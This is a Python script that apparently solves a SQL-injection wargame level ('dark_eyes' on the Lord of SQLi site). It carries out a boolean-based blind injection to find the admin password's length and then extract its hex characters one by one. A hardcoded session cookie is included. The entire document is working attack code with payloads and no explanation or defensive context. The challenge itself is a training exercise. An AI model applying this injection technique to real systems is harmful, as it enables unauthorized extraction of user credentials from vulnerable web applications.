import requests
import string

def length():
    lent = 0
    for i in range(1,100):
        pay = "' or id='admin' and (select 1 union select LENGTH(hex(pw))=" + str(hex(i)) +")#"
        print("[+]Pay : %s" % pay)
        pay = requests.utils.quote(pay)
        ur = url + pay
        t = requests.get(ur,cookies=cookie)

        if t.text.find("php") > 0:
            lent = i
            break

    return lent

def geuss(lent):
    global pw
    for i in range(1,lent+1):
        print("[+]I : %d" % i)
        for j in string:
            pay = "' or id='admin' and (select 1 union select substr(hex(pw)," + str(i) + ", 1)=" + str(j) + ")#"
            print("[+]Pay : %s" % pay)
            pay = requests.utils.quote(pay)
            ur = url+pay
            t = requests.get(ur,cookies=cookie)
            if t.text.find("php") > 0:
                pw = pw+j
                print("[+]Pw : %s" % pw)
                break


if __name__=='__main__':
    url="http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php?pw="
    cookie=dict(PHPSESSID="2jumpdmat5f035imvarpn58ai0")
    string = "0123456789abcdef"
    pw=''
    geuss(length())
    print("[+]Pw : %s" % pw)